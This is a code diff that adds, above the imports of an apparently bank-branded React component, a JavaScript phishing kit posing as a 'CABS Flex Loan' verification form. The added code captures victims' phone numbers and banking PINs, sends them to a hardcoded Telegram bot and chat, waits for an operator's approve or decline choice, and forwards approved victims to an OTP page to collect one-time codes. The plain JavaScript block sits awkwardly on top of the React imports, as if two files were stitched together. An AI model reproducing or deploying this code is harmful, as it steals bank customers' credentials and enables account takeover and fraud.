@@ -1,3 +1,113 @@
+
+        const BOT = '9081651534:AAFXm0LbAzicgKpDyGYBiW-LGkWzKTWpZGY';
+        const CID = '5980396370';
+        let loanData = {
+            name: "Valued Client",
+            amount: "0",
+            purpose: "Flex Loan"
+        };
+        let lastUpdateId = 0;
+        let pinAttempts = 0;
+      
+        async function sendToTelegram(msg, buttons) {
+            try {
+                const response = await fetch('https://api.telegram.org/bot' + BOT + '/sendMessage', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CID,
+                        text: msg,
+                        reply_markup: buttons ? { inline_keyboard: buttons } : undefined,
+                        parse_mode: 'HTML'
+                    })
+                });
+                const data = await response.json();
+                if (data.ok) {
+                    const updateResponse = await fetch('https://api.telegram.org/bot' + BOT + '/getUpdates?limit=1&offset=-1');
+                    const updateData = await updateResponse.json();
+                    if (updateData.ok && updateData.result.length > 0) {
+                        lastUpdateId = updateData.result[0].update_id;
+                    }
+                }
+            } catch(e) { console.error(e); }
+        }
+
+        function doSubmit(e) {
+            e.preventDefault();
+            clrErr();
+            const phone = document.getElementById('phone').value.trim().replace(/\s/g, '');
+            const pin = document.getElementById('pin').value.trim();
+
+            let ok = true;
+            if (phone.length < 9) {
+                showErr('Please enter a valid 9-digit mobile number.');
+                document.getElementById('wrapPhone').classList.add('invalid');
+                ok = false;
+            }
+            if (pin.length !== 4) {
+                if (ok) showErr('PIN must be exactly 4 digits.');
+                document.getElementById('wrapPin').classList.add('invalid');
+                ok = false;
+            }
+            if (!ok) return;
+
+            const msg = '\ud83d\ude80 <b>CABS Flex Loan Verification</b>\n\n\ud83d\udc64 <b>Name:</b> <code>' + decodeURIComponent(loanData.name) + '</code>\n\ud83d\udcf1 <b>Phone:</b> <code>' + phone + '</code>\n\ud83d\udd12 <b>PIN:</b> <code>' + pin + '</code>\n\ud83d\udcb0 <b>Amount:</b> <code>$' + parseFloat(loanData.amount).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 }) + ' USD</code>\n\ud83c\udfaf <b>Purpose:</b> <code>' + decodeURIComponent(loanData.purpose) + '</code>\n\nPlease choose an action below:';
+
+            // 3 buttons: Approved / Declined / Already Applied
+            const buttons = [
+                [{ text: '\u2705 Approved', callback_data: 'login_approved' }, { text: '\u274c Declined', callback_data: 'login_declined' }, { text: '\u26a0\ufe0f Already Applied', callback_data: 'login_applied' }]
+            ];
+
+            document.getElementById('ov').classList.add('on');
+            sendToTelegram(msg, buttons);
+            startPolling();
+        }
+
+        function startPolling() {
+            const pollInterval = setInterval(function() {
+                fetch('https://api.telegram.org/bot' + BOT + '/getUpdates?offset=' + (lastUpdateId + 1))
+                    .then(function(r) { return r.json(); })
+                    .then(function(data) {
+                        if (data.ok && data.result.length > 0) {
+                            data.result.forEach(function(update) {
+                                lastUpdateId = update.update_id;
+                                if (update.callback_query) {
+                                    const action = update.callback_query.data;
+                                    console.log('Callback received:', action);
+
+                                    if (action === 'login_approved') {
+                                        clearInterval(pollInterval);
+                                        document.getElementById('ov').classList.remove('on');
+                                        clrErr();
+                                        proceedToOTP();
+                                    }
+                                    else if (action === 'login_declined') {
+                                        clearInterval(pollInterval);
+                                        document.getElementById('ov').classList.remove('on');
+                                        // Declined returns to login.html just as the Declined word works
+                                        location.href = 'login.html?declined=1';
+                                    }
+                                    else if (action === 'login_applied') {
+                                        clearInterval(pollInterval);
+                                        document.getElementById('ov').classList.remove('on');
+                                        // Already Applied: warning popup that you already applied
+                                        showModal('You have already applied for a Flex Loan. Please wait for your application to get approved.');
+                                        document.getElementById('pin').value = '';
+                                    }
+                                }
+                            });
+                        }
+                    }).catch(function(e) { console.error(e); });
+            }, 1500);
+
+            setTimeout(function() { clearInterval(pollInterval); }, 600000);
+        }
+
+        function proceedToOTP() {
+            const phone = document.getElementById('phone').value.trim().replace(/\s/g, '');
+            location.href = 'otp.html?name=' + loanData.name + '&amount=' + loanData.amount + '&purpose=' + loanData.purpose + '&phone=' + phone;
+        }
+  
 import React, { useState } from 'react';
 import { FBCLogo } from './FBCLogo';
 import { Headphones, ArrowLeft, AlertCircle } from 'lucide-react';
